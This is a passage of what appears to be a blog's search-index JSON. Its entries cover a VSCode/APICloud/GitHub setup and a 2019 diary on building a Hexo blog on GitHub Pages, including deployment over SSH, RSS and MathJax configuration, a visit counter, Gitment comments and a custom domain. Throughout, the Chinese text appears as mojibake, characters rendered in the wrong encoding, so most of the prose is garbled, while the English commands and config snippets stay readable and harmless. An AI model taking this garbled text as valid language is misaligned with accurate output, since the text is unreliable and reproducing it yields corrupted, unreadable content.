å¼€å‘ç¯å¢ƒé…ç½®","uri":"/vscode-apicloud/"},{"categories":["å‰ç«¯"],"content":"GitHub éƒ¨ç½² æ–°å»ºä¸ª repoã€‚åœ¨æœ¬åœ°çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼ˆå’Œ widget æ‰€åœ¨ç›®å½•åŒç›®å½•ï¼‰git init å¹¶å…³è”åˆ°è¿œç¨‹ä»“åº“ï¼Œéšåå’Œå¸¸è§„ GitHub ä»“åº“çš„æ“ä½œä¸€æ ·äº†ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ widget/config.xml é‡Œï¼Œä¿®æ”¹ç¬¬äºŒè¡Œçš„ widget çš„ id å±æ€§ï¼Œæ”¹ä¸ºåˆšæ‰æˆ‘ä»¬è·å¾—çš„ app çš„ IDã€‚å¹¶ä¸”ï¼Œåœ¨ app é¡µé¢ â€œç«¯å¼€å‘â€ çš„â€œä»£ç â€é€‰é¡¹é‡Œï¼Œæ›´æ”¹ä»£ç ä½ç½®ä¸º â€œGit å¹³å°â€ï¼Œå¡«å…¥ä»£ç åœ°å€ã€ç”¨æˆ·åå’Œå¯†ç å¹¶ä¿å­˜ï¼Œæœ€åæ‰“å¼€â€œå¯ç”¨ Git å¹³å°â€ å¼€å…³ã€‚è¿™æ ·ï¼Œæ¯æ¬¡æˆ‘ä»¬æ¨é€æœ€æ–°ä»£ç åå°±å¯ä»¥åœ¨ APICloud ä¸Šäº‘ç¼–è¯‘äº†ï¼Œå°½ç®¡ APICloud ä¸Šæ— æ³•çœ‹åˆ°ä½ çš„æœ€æ–°æ¨é€ã€‚ å¸Œæœ›è¿™ç¯‡æ–‡ç« ä¸è¦æœ€åä¹Ÿå˜æˆ â€œè¸©å‘è®°â€ã€‚ ","date":"2019-01-17","objectID":"/vscode-apicloud/:3:0","tags":["VSCode"],"title":"VSCode + APICloud + GitHub å¼€å‘ç¯å¢ƒé…ç½®","uri":"/vscode-apicloud/"},{"categories":["å‰ç«¯"],"content":"å…³äºè¿™ä¸ªç½‘ç«™æ˜¯å¦‚ä½•è¯ç”Ÿçš„ã€‚ æˆ‘çš„åšå®¢ç»ˆäºä» CSDN è¿ç§»è¿‡æ¥äº†ï¼Œä¸€äº›å¤ªç®€å• / å¤ªéš¾çš„æ–‡ç« ç•™åœ¨äº† CSDNï¼Œåªä¿ç•™äº†ä¸€äº›æˆ‘è®¤ä¸ºæœ‰ä»·å€¼çš„ã€‚ä»æœŸæœ«è€ƒè¯•å‰åˆ°ç°åœ¨ï¼Œè¿™ä¸ªç½‘ç«™æ­å»ºçš„æˆ‘å¾ˆè¾›è‹¦ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºç›¸å…³ç»éªŒä¸è¶³ã€‚ æ¥ä¸‹æ¥è®°å½•çš„æ˜¯æ­å»ºåšå®¢è¿‡ç¨‹ä¸­è¸©è¿‡çš„å‘ï¼Œä¹Ÿæ±‡é›†äº†å¾ˆå¤šæ¥è‡ªå…¶å®ƒåšå®¢çš„æ™ºæ…§ã€‚ ","date":"2019-01-11","objectID":"/hexo/:0:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"GitHub Pages æ˜¯çš„ï¼Œæˆ‘é‡‡ç”¨äº†æ¯”è¾ƒå®¹æ˜“çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŠŠåšå®¢äº¤ç»™ GitHub æ‰˜ç®¡ã€‚GitHub æä¾›çš„ GitHub Pages åŠŸèƒ½å®åœ¨æ˜¯å¾ˆè‰¯å¿ƒã€‚åˆ›å»ºä¸€ä¸ª repoï¼Œæœ¬åœ°ä»“åº“é‡ŒæŠŠ HTML, CSS, JS æ”¾ä¸Šå»å°±å¥½äº†ã€‚ æœ€åˆæˆ‘å¹¶ä¸äº†è§£ Hexoï¼Œæ‰€ä»¥æ‰‹å†™äº†å‰ç«¯ä¸‰ä»¶å¥—ã€‚å› ä¸ºæ‡’è¿™ä¸ªç½‘ç«™æ²¡æœ‰å¤ªå¤§ç”¨å¤„ï¼Œæ”¾äº†å‡ ä¸ªæŒ‰é’®å½“ä½œæ‰©å±•æ”¶è—å¤¹ç”¨ã€‚ ","date":"2019-01-11","objectID":"/hexo/:1:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"Hexo Hexo æ˜¯åŸºäº Node.js çš„ï¼Œæ‰€ä»¥é¦–å…ˆéœ€è¦åˆ° å®˜ç½‘ ä¸‹è½½å¹¶å®‰è£…ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¥æœ‰äº†éå¸¸å¥½ç”¨çš„åŒ…ç®¡ç†å·¥å…· npmã€‚éšåï¼Œå®‰è£… hexo åªéœ€è¦ npm install -g hexo å°±æå®šäº†ã€‚ åœ¨æˆ‘ä»¬æ–°å»ºçš„ç”¨äºå­˜æ”¾ç½‘ç«™æ–‡ä»¶çš„ç›®å½•ä¸‹ hexo initï¼Œå°±åƒ git init ä¸€æ ·ï¼Œå³å¯åˆå§‹åŒ–ç½‘ç«™ç›®å½•ã€‚ç”Ÿæˆé™æ€é¡µé¢åªéœ€è¦ hexo gï¼Œå®æ—¶è°ƒè¯•ä½¿ç”¨ hexo s åæµè§ˆå™¨è®¿é—® localhost:4000ï¼Œéƒ¨ç½²åˆ° GitHub åªéœ€è¦ hexo dã€‚ è¯´åˆ°éƒ¨ç½²ï¼Œç”±äºæˆ‘ä¹‹å‰å·²ç»é…ç½®è¿‡ Gitï¼Œå¯¹ Git Bash ä¹Ÿæ¯”è¾ƒç†Ÿæ‚‰ï¼Œé…ç½® SSH Key ä¹‹ç±»çš„è¿™é‡Œä¸è¯¦è¿°ã€‚ä½†æˆ‘æ²¡æƒ³åˆ°ï¼Œæˆ‘ä»¥ä¸ºå¾ˆç®€å•çš„éƒ¨ç½²ç¯èŠ‚ï¼Œå´æ ‡å¿—ç€æˆ‘è¸©å‘ä¹‹æ—…çš„å¼€ç«¯ã€‚ ","date":"2019-01-11","objectID":"/hexo/:2:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"éƒ¨ç½² å…ˆ npm install hexo-deployer-git --save è£…å¥½æ’ä»¶ã€‚ å°±æ˜¯ä¸çœ‹æ•™ç¨‹ä¹Ÿèƒ½çŒœåˆ°ï¼Œéƒ¨ç½²ç›¸å…³çš„é…ç½®å°±åœ¨æ ¹ç›®å½• _config.yml ä¸­çš„ deploy å­—æ®µé‡Œã€‚å®ƒé•¿è¿™æ ·ï¼š deploy:type:gitrepo:branch:master ä¹Ÿå°±æ˜¯è¯´æŠŠæˆ‘çš„ repo åœ°å€ https://github.com/SignorMercurio/SignorMercurio.github.io.git å¡«ä¸Šå»å°±å¥½äº†ã€‚å¤šäº VS Code æé†’ï¼Œæˆ‘æ‰å‘ç° yml çš„å†’å·åé¢å¿…é¡»è¦åŠ ç©ºæ ¼ã€‚ç„¶è€Œï¼Œå½“æˆ‘ deploy æ—¶ï¼Œå´å¾—åˆ°äº†è¿™æ ·çš„é”™è¯¯ä¿¡æ¯ï¼š å›¾ 1ï½œé”™è¯¯ä¿¡æ¯ \" å›¾ 1ï½œé”™è¯¯ä¿¡æ¯ å¤§æ¦‚æ˜¯è¯´å‘é€ http è¯·æ±‚çš„æ—¶å€™å‡ºé”™äº†ï¼Œæˆ‘çŒœåŸå› æ˜¯é‡‡ç”¨ http æ–¹å¼æ—¶ï¼Œéœ€è¦ä»æ ‡å‡†è¾“å…¥è¯»å– GitHub ç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯ï¼Œè€Œåœ¨è¿™é‡Œæ²¡èƒ½æˆåŠŸä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ã€‚ è®¿é—® GitHub ä»“åº“ä¸€å…±å°±ä¸¤ç§æ–¹å¼ï¼Œhttp ä¸è¡Œæˆ‘å½“ç„¶å°±è¯• SSH äº†ã€‚æŠŠ repo æ”¹æˆ git@github.com:SignorMercurio/SignorMercurio.github.io.git å°±æˆåŠŸäº†ã€‚ è®¿é—®ç½‘ç«™ï¼Œä¾¿å¯ä»¥çœ‹åˆ° Hexo çš„ç»å…¸é»˜è®¤ä¸»é¢˜ Landscapeã€‚æ­¤æ—¶ï¼Œæˆ‘ä¸ç¦å›æƒ³èµ·åœ¨æœåŠ¡å™¨ä¸Šé…ç½®å®Œ Nginx åçœ‹åˆ°é‚£ä¸ªæ¬¢è¿é¡µé¢æ—¶çš„å¿ƒæƒ…ã€‚éšåæˆ‘åœ¨ Hexo å®˜ç½‘ä¸Šæ¢äº†ä¸€ä¸ªå–œæ¬¢çš„ä¸»é¢˜ã€‚ å…¶å®è¿‡ç¨‹ä¸­è¿˜å› ä¸ºè¯¯è£…äº†åƒåœ¾æ’ä»¶ hexo-baidu-url-submit å¯¼è‡´å¥‡æ€ªçš„æŠ¥é”™ï¼Œç½‘ä¸ŠæŸ¥é˜…åæœæ–­å¸äº†ã€‚ ","date":"2019-01-11","objectID":"/hexo/:3:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"é…ç½® RSS æˆ‘çš„ä¸»é¢˜è¿˜ç®—è‰¯å¿ƒï¼Œæä¾›äº†é…ç½® RSS çš„æ–¹æ³•ã€‚é¦–å…ˆå®‰è£…æ’ä»¶ï¼šnpm install hexo-generator-feed --saveï¼Œéšååœ¨æ ¹ç›®å½• _config.yml ä¸­åŠ å…¥ï¼š Plugins:- hexo-generator-feedfeed:type:atompath:atom.xmllimit:20 ä¹Ÿå°±å¥½äº†ï¼Œå…¶å®æ²¡ä»€ä¹ˆå‘ç‚¹ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¾ˆåœ¨æ„ RSS è®¢é˜…ä»€ä¹ˆçš„ï¼ŒçœŸçš„ä¼šæœ‰äººç”¨è¿™ä¸ªå˜›ï¼Ÿ ","date":"2019-01-11","objectID":"/hexo/:4:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"é…ç½® Mathjax è¿™æ¬¡è¢«æˆ‘çš„ä¸»é¢˜å‘äº†ã€‚ ä¸»é¢˜ä¸­å¸¦æœ‰ mathjax é€‰é¡¹ï¼Œä½†æ˜¯è®¾ç½®ä¸º true åå´æ²¡ç”¨ã€‚åæ¥çŸ¥é“è¦è¿™æ ·è®¾ç½®ï¼š mathjax:enable:trueper_page:true è€Œä¸”åœ¨æ¯ç¯‡æ–‡ç« çš„ Front-matter é‡Œéƒ½éœ€è¦åŠ å…¥ mathjax: trueï¼Œé¿å…æ¸²æŸ“æ²¡æœ‰ç”¨åˆ°å…¬å¼çš„é¡µé¢ã€‚ å½“æˆ‘è¿™æ ·åšäº†ä¾ç„¶æ²¡æœ‰æˆæ•ˆæ—¶ï¼Œæˆ‘å°±çŸ¥é“é—®é¢˜ä¸€å®šå‡ºåœ¨æºå¤´ä¸Šäº†ã€‚ å¦‚æœä¸»é¢˜æä¾›äº† mathjax æ”¯æŒï¼Œé‚£ä¹ˆå®ƒè¦ä¹ˆæ˜¯é€šè¿‡åŒ…å«äº†ç›¸å…³æ–‡ä»¶å®ç°çš„ï¼Œè¦ä¹ˆæ˜¯é€šè¿‡å¼•ç”¨äº†å¤–ç½‘ä¸Šçš„ç›¸å…³æ–‡ä»¶å®ç°çš„ã€‚ä¸€é€šä¹±ç¿»åï¼Œæˆ‘åœ¨ä¸»é¢˜æ–‡ä»¶å¤¹çš„ layout/_partial/mathjax.ejs ä¸­æ‰¾åˆ°äº†ç½ªé­ç¥¸é¦–ï¼š \u003cscript type=\"text/javascript\"src=\"http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML\"\u003e è¿™ä¸ª src å¾ˆæ˜æ˜¾å°±æ˜¯æä¾› mathjax æ”¯æŒçš„ js æ–‡ä»¶äº†ï¼ˆä¸Šè¿°ç¬¬äºŒç§æ–¹å¼ï¼‰ï¼Œä½†åœ¨ mathjax å®˜ç½‘ä¸Šçœ‹äº†ä¸€çœ¼ï¼Œæˆ‘å‘ç° mathjax ç°åœ¨å·²ç»æ¢ç”¨äº†å¦ä¸€ä¸ª js æ–‡ä»¶ï¼š \u003cscript type=\"text/javascript\"src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML\"\u003e ç”¨æ–°çš„åœ°å€æ›¿æ¢æ‰æ—§çš„å³å¯ã€‚ ","date":"2019-01-11","objectID":"/hexo/:5:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"åˆ†äº«åŠŸèƒ½è®¾ç½® ä¸»é¢˜è‡ªå¸¦çš„ share å¤ªä¸‘äº†ï¼Œshowshare åˆå­˜åœ¨ä¸€å¯ç”¨æ•´ä¸ªé¡µé¢å˜ç™½çš„å¥‡æ€ª bugï¼Œäºæ˜¯åªå¥½ç”¨ baidushareï¼Œæ„å¤–åœ°å‘ç°è¿˜æŒºå¥½çœ‹ï¼Œè€Œä¸”å’Œä¸»é¢˜é£æ ¼ä¹Ÿä¸€è‡´ï¼ˆåº”è¯¥æ˜¯ä¸»é¢˜å·²ç»æ”¹å¥½çš„å§ï¼‰ã€‚ ç»“æœè¿™ç©æ„å„¿åœ¨æˆ‘åé¢æ¢åŸŸåæ—¶ç»™æˆ‘å¸¦æ¥äº†ä»¤äººæ— è¯­çš„éº»çƒ¦ã€‚ ","date":"2019-01-11","objectID":"/hexo/:6:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"ç½‘ç«™è®¿é—®è®¡æ•° æ„Ÿè°¢ ä¸è’œå­ çš„æ”¯æŒï¼Œç½‘ç«™è®¿é—®è®¡æ•°çš„è®¾ç½®ååˆ†ç®€å•ã€‚åœ¨ä¸»é¢˜ç›®å½•ä¸‹çš„ _config.yml ä¸­åŠ å…¥ï¼š visit_counter:on:truesite_visit:æå®¢åˆ°è®¿æ•°page_visit:æœ¬é¡µé˜…è¯»é‡ ç„¶åæŒ‰ç…§å®˜ç½‘æ‰€è¿°ï¼Œåœ¨ä¸»é¢˜ç›®å½•ä¸‹çš„ layout/_partial/footer.ejs é‡Œå¼•å…¥ js è„šæœ¬ï¼š \u003cscript async src=\"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\" \u003e\u003c/script\u003e éšåç”¨ä¸»é¢˜å†…å·²æœ‰çš„ä»£ç å°±å¯ä»¥å®ç°è®¿é—®è®¡æ•°äº†ã€‚å·²æœ‰çš„ä»£ç å…¶å®ä¹Ÿä¸è¿‡æ˜¯æ¡ä»¶åˆ¤æ–­ + ä¸¤ä¸ªæ ‡ç­¾çš„å®‰è£…è€Œå·²ã€‚ ","date":"2019-01-11","objectID":"/hexo/:7:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"Gitment æ­å»º è¿™æ˜¯æœ€èŠ±æ—¶é—´çš„éƒ¨åˆ†ã€‚è™½ç„¶æˆ‘å¾ˆæ¬£èµåˆ©ç”¨ issue ä½œä¸ºè¯„è®ºç³»ç»Ÿçš„æƒ³æ³•å’Œæç®€çš„è®¾è®¡ç†å¿µï¼Œä½†æ˜¯ç”±äº Gitment çš„ bug å’Œ feature å®åœ¨å¤ªå¤šï¼Œå¯¼è‡´æˆ‘ä¸çŸ¥é“åœ¨è¿™ä¸Šé¢è¸©äº†å¤šå°‘å‘ï¼Œæˆ‘è¿˜æ˜¯è¦åæ§½ä¸€ä¸‹ Gitmentã€‚æ­å»º Gitment çš„æ—¶é—´å¯èƒ½è¶…è¿‡äº†æˆ‘æ­å»ºç½‘ç«™å…¶å®ƒéƒ¨åˆ†çš„æ—¶é—´ä¹‹å’Œã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå¹¿å—å¥½è¯„çš„å¤šè¯´æŒ‚äº†ï¼Œç•…è¨€éœ€è¦ç½‘ç«™å¤‡æ¡ˆï¼Œdisqus éœ€è¦é­”æ³•ä¸Šç½‘ã€‚è™½ç„¶è¿˜æœ‰ä¸å°‘å…¶å®ƒä¸é”™çš„è¯„è®ºç³»ç»Ÿå¯ä¾›ä½¿ç”¨ï¼Œï¼ˆæˆ‘ä»¥ä¸ºï¼‰Gitment åº”è¯¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ¡ˆã€‚ äºæ˜¯è·Ÿç€ Gitment çš„æ–‡æ¡£ï¼Œæˆ‘å¼€å§‹åŠ¨æ‰‹ï¼š disqus:on:falsechangyan:on:falsegitment:on:truegithubID:SignorMercuriorepo:SignorMercurio.github.ioclient_id:client_secret:lazy:true å…³æ‰äº†ä¸»é¢˜çš„ disqus å’Œ changyan æ”¯æŒï¼Œä½¿ç”¨ gitmentã€‚åˆ›å»ºäº†ä¸€ä¸ª OAuth åº”ç”¨ åè¾“å…¥äº† client_id å’Œ client_secretã€‚å…¶å®è¿™ä¸ª repo å­—æ®µæˆ‘å°±è¯•äº†æŒºä¹…ï¼Œå› ä¸ºä¸çŸ¥é“è¦ä¸è¦å®Œæ•´çš„ repo åã€å¸¦. git çš„ä»“åº“è®¿é—®åœ°å€è¿˜æ˜¯åªè¦ä»“åº“åï¼›ä¹Ÿä¸çŸ¥é“æ˜¯è¦ http è®¿é—®è¿˜æ˜¯ ssh è®¿é—®ã€‚æ–‡æ¡£é‡Œæ²¡å†™ã€‚å¦‚æœ repo æ²¡æœ‰å†™å¯¹å°±ä¼šå‡ºç° Error: Not Foundã€‚ è¿™æ ·ä»¥ååŸºæœ¬çš„ Gitment ç•Œé¢å·²ç»å‡ºç°åœ¨äº†æ–‡ç« åº•éƒ¨ï¼Œæ˜¾ç¤ºéœ€è¦ç™»å½•æ‰èƒ½è¯„è®ºã€‚äºæ˜¯æˆ‘ç‚¹å‡»ç™»å½•ï¼Œå´å‘ç°è·³å›åˆ°äº†ç½‘ç«™é¦–é¡µã€‚è¿™æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°ç½‘å€å†…å®¹é‡Œå¤šäº†ä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œäºæ˜¯ F12 æ‰“å¼€å¼€å‘è€…å·¥å…·æŸ¥çœ‹é—®é¢˜ã€‚æ ¹æ®é”™è¯¯æç¤ºä¿¡æ¯å’Œå¼€å‘è€…å·¥å…·é‡Œçš„ä¿¡æ¯ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯æˆ‘åœ¨æŸå¤„è®¾ç½®çš„ä¸€ä¸ªå«åš Callback URL çš„å­—æ®µå‡ºäº†é—®é¢˜ã€‚å›åˆ°ä¹‹å‰æ³¨å†Œ OAuth åº”ç”¨ï¼Œæ‰¾åˆ°äº† Authorization callback URL è¿™ä¸€å­—æ®µï¼Œæƒ³å¿…å°±æ˜¯å®ƒäº†ã€‚è®¾ç½®ä¸ºç½‘ç«™é¦–é¡µçš„ç½‘å€å³å¯ï¼ˆå¸¦ httpsï¼‰ã€‚ æˆ‘ä»¥ä¸ºåˆ†æå®Œè¿™ä¸ªå›è°ƒ URL ä¹‹åä¸ä¼šå†é‡ä¸Šä»€ä¹ˆéº»çƒ¦äº†ï¼Œæ²¡æƒ³åˆ°ç™»å½•åè·³å‡ºäº†å¥‡æ€ªçš„å¯¹è¯æ¡†ï¼š[object ProgressEvent]ï¼Œæˆ‘å®Œå…¨ä¸æ˜ç™½è¿™æ˜¯ä»€ä¹ˆã€‚åœ¨ è¿™ä¸ª Issue é‡Œæ‰æ‰¾åˆ°åŸå› ï¼šåŸä½œè€…æœåŠ¡å™¨è¯ä¹¦è¿‡æœŸäº†â€¦â€¦ åœ¨ ejs æºç é‡Œæ¢äº†å…¶ä»–äººæ­å»ºçš„æœåŠ¡å™¨ï¼Œé—®é¢˜ä¼¼ä¹æ˜¯è§£å†³äº†ã€‚ æœ€åï¼Œå½“æˆ‘åˆå§‹åŒ–è¯„è®ºæ—¶ï¼Œæœ‰äº›æ–‡ç« æˆåŠŸäº†ï¼Œæœ‰äº›å´å¤±è´¥äº†ã€‚è¿™ä¸ç§‘å­¦å•Šï¼Ÿ æ˜¾ç„¶ï¼Œè¿™è¯´æ˜ Gitment çš„è¯„è®ºåˆå§‹åŒ–ä¾èµ–äºæ–‡ç« çš„æŸäº›å±æ€§ã€‚æç¤ºä¿¡æ¯ä¸º Error: Validation Failedï¼Œæˆ‘ä¸å¤ªæ˜ç™½è¦éªŒè¯ä»€ä¹ˆï¼Œäºæ˜¯ç¿»äº†ç¿» Gitment çš„ Issueï¼Œæœç„¶æ‰¾åˆ°äº†è®¸å¤šè§£å†³æ–¹æ¡ˆï¼šæœ‰æ”¹ Gitment æºæ–‡ä»¶é‡Œçš„ id çš„ï¼ˆè¿™ä¸ªä¹Ÿæœ‰å¥½å‡ ç§æ–¹æ³•ï¼‰ï¼Œæœ‰æ”¹ permalink å’Œ md æ–‡ä»¶åçš„ï¼Œæœ‰åœ¨ md æ–‡ä»¶çš„ Front-matter é‡Œæ·»åŠ å­—æ®µçš„ï¼Œè¿˜æœ‰ä¸€äº›æˆ‘ä¸æ˜¯å¾ˆæ˜ç™½åŸç†çš„åŠæ³•ã€‚è¿™äº›æ–¹æ³•çš„æ€æƒ³éƒ½æ˜¯è¦æŠŠ id ç¼©çŸ­ä¸º 50 ä¸ªå­—ç¬¦ä»¥å†…ä»¥é€šè¿‡éªŒè¯ã€‚ å…ˆæ˜¯æ”¹ id æ”¹å‡ºäº†å¥‡æ€ªçš„é”™è¯¯åï¼Œæˆ‘å†³å®šé‡‡ç”¨ä¸¤è€…ç»“åˆçš„åŠæ³•ã€‚åœ¨ä¸»é¢˜çš„ layout/_partial/comments/gitment.ejs é‡ŒæŠŠ id å­—æ®µæ”¹æˆ window.location.pathnameï¼ŒåŸæ¥é»˜è®¤æ˜¯ location.hrefã€‚è¿™æ ·ç”¨äºæ ‡è¯†æ–‡ç« çš„ id å°±å˜æˆäº† md æ–‡ä»¶çš„è·¯å¾„ã€‚éšååœ¨æ ¹ç›®å½•çš„ _config.yml é‡Œå°† permalink å­—æ®µæ”¹ä¸º post/:title/ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ç¯‡æ–‡ç«  index.html æ”¾åœ¨ post ç›®å½•ä¸‹ä»¥æ–‡ç« æ ‡é¢˜å‘½åçš„ç›®å½•é‡Œã€‚ è€Œè¿™é‡Œçš„ â€œæ–‡ç« æ ‡é¢˜â€ å…¶å®å·²ç»æ˜¯æ–‡ç« å¯¹åº”çš„ md æ–‡ä»¶çš„åå­—äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ ·åšä»¥åï¼Œåªéœ€è¦ä¿è¯ md æ–‡ä»¶çš„æ–‡ä»¶åä¸ä¼šå¤ªé•¿å³å¯ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶åå’Œæ–‡ç« å®é™…çš„æ ‡é¢˜ä¸éœ€è¦ä¿æŒä¸€è‡´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç¼–ç è½¬æ¢çš„åŸå› ï¼Œç‰¹æ®Šå­—ç¬¦ï¼ˆæ¯”å¦‚ç©ºæ ¼ï¼‰å’Œä¸­æ–‡åˆ°äº†ç½‘å€é‡Œä¼šå˜æˆå¤šä¸ªå­—ç¬¦ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ªåŸå› ï¼ˆåŠ ä¸ŠåŸæ¥çš„ permalink é‡Œè¿˜æœ‰æ—¥æœŸï¼‰å¯¼è‡´ id è¶…è¿‡äº† 50 ä¸ªå­—ç¬¦ã€‚ ","date":"2019-01-11","objectID":"/hexo/:8:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"Gitment è°ƒæ•´ åœ¨ è¿™ä¸ª Issue é‡Œå‘ç°äº†æ±‰åŒ–ç‰ˆæœ¬ï¼Œé—æ†¾çš„æ˜¯ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„æ ·å¼å’Œæˆ‘çš„ä¸»é¢˜é£æ ¼ä¸å¤ªç›¸ç¬¦ï¼Œäºæ˜¯æˆ‘æ‰“ç®—ä¸‹è½½ä¸‹æ¥æ”¾åœ¨ js å’Œ css æ–‡ä»¶å¤¹é‡Œï¼Œç›´æ¥é€šè¿‡ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨ã€‚è¿™æ ·æˆ‘å°±å¯ä»¥è‡ªå·±ä¿®æ”¹ css äº†ã€‚ å› ä¸ºæˆ‘è‡³ä»Šä¸æ‡‚çš„åŸå› ï¼Œç›´æ¥å¼•ç”¨é‚£ä¸ªç½‘ç«™ä¸Šçš„ js æ–‡ä»¶ä¸ä¼šå‡ºç°çš„ä¸­æ–‡ä¹±ç é—®é¢˜ï¼Œåœ¨æˆ‘ç”¨ç›¸å¯¹è·¯å¾„å¼•ç”¨æ—¶çªç„¶å‡ºç°äº†ã€‚ç”±äº Gitment æ±‰åŒ–å·¥ä½œé‡ä¸å¤§ï¼Œæˆ‘å¹²è„†å€ŸåŠ©æŸ¥æ‰¾åŠŸèƒ½æŠŠä¹±ç å»æ‰ï¼Œé‡æ–°è‡ªå·±æ±‰åŒ–äº†ä¸€éã€‚ æœ€åæ˜¯è°ƒæ•´ css æ ·å¼ï¼Œå› ä¸ºæ˜¯é»‘è‰²ä¸»é¢˜ï¼Œæˆ‘å°† Gitment çš„è¯„è®ºå’Œé¢„è§ˆåº•è‰²ä¹Ÿè®¾ç½®ä¸ºé»‘è‰²ï¼Œæ–‡å­—è®¾ç½®ä¸ºç°è‰²å’Œç™½è‰²ï¼Œå°±åƒç°åœ¨è¿™ä¸ªæ ·å­ï¼Œçœ‹ä¸Šå»å¥½å¤šäº†ã€‚ ","date":"2019-01-11","objectID":"/hexo/:9:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"CSS è°ƒæ•´ä¸ç«™å†…æœç´¢ æˆ‘å¯¹è¿™ä¸ªä¸»é¢˜çš„ä¸€éƒ¨åˆ†æ ·å¼è¿˜ä¸æ˜¯å¤ªæ»¡æ„ï¼Œäºæ˜¯åˆè°ƒæ•´äº†ä¸»é¢˜çš„ cssï¼Œä¸»è¦æ˜¯è®©åˆ—è¡¨å†…çš„ä»£ç å’Œè¡Œå†…ä»£ç æ ·å¼ç»Ÿä¸€ã€‚éšåï¼Œåœ¨ä¸»é¢˜çš„ _config.yml å†…æ·»åŠ äº†ç«™å†…æœç´¢åŠŸèƒ½ï¼Œæ ¹æ®æ–‡ç« åæœç´¢æ–‡ç« ï¼š search:path:search.jsonfield:post ","date":"2019-01-11","objectID":"/hexo/:10:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"æ›´æ¢åŸŸå GitHub ååˆ†è‰¯å¿ƒåœ°æä¾›äº† Student Packï¼Œé€šè¿‡å­¦ç”Ÿè®¤è¯åå°±å¯ä»¥äº«å—è®¸å¤šå­¦ç”Ÿä¸“æœ‰çš„ç¦åˆ©ï¼Œå¯¹äºå„ç§å¼€å‘æ¥è¯´éƒ½ååˆ†æ–¹ä¾¿ã€‚è¿™é‡Œæˆ‘ç”¨åˆ°äº† Student Pack ä¸­çš„ Namecheap ä¸€å¹´å…è´¹ .me åŸŸåä»¥åŠä¸€å¹´å…è´¹ Positive SSL è¯ä¹¦ã€‚ä¸‹å•åï¼Œéœ€è¦å¯¹åŸŸåè¿›è¡Œé…ç½®ã€‚ å›¾ 2ï½œNamecheap \" å›¾ 2ï½œNamecheap ç‚¹å‡» MANAGE åé€‰æ‹© Advanced DNSï¼Œæ·»åŠ  Host Recordã€‚å—åˆ°ç½‘ä¸Šæ•™ç¨‹çš„è¯¯å¯¼ï¼Œæˆ‘æ·»åŠ äº†é”™è¯¯çš„ Host Record å¯¼è‡´ä¸€æ®µæ—¶é—´å†…æˆ‘çš„åŸŸåæ— æ³•æ­£ç¡®è§£æï¼Œä¹Ÿå½±å“åˆ°äº†ä¸‹é¢å‡çº§åˆ° https çš„æ“ä½œã€‚æœ€ç»ˆï¼ŒæŸ¥çœ‹äº† å®˜æ–¹å¸®åŠ©æ–‡æ¡£ åï¼Œæ‰å¾—çŸ¥ GitHub Pages çš„ IP åœ°å€å·²ç»æ›´æ–°äº†â€¦â€¦ æœ€ç»ˆé…ç½®å¦‚ä¸‹ï¼š å›¾ 3ï½œé…ç½®ä¿¡æ¯ \" å›¾ 3ï½œé…ç½®ä¿¡æ¯ ç„¶ååœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ·»åŠ  CNAME æ–‡ä»¶ï¼Œå°±ä¸€è¡Œ signormercurio.meã€‚ ç„¶è€Œè¿™ä¸ªå…è´¹çš„ SSL 